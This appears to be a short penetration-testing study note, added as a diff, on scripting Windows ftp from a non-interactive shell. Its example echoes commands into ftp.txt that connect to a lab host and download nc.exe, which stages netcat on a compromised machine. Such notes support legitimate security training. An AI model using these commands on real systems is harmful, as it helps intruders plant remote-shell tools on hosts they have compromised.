@@ -1,0 +1,11 @@
+In order to run ftp from non interactive shell you can use a file by copying the commands you would use to connect to the ftp sever and echo them into a file.
+
+See below for example:
+
+C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt
+C:\Users\offsec>echo USER offsec>> ftp.txt
+C:\Users\offsec>echo ftp>> ftp.txt
+C:\Users\offsec>echo bin >> ftp.txt
+C:\Users\offsec>echo GET nc.exe >> ftp.txt
+C:\Users\offsec>echo bye >> ftp.txt
+C:\Users\offsec>ftp -v -n -s:ftp.txt
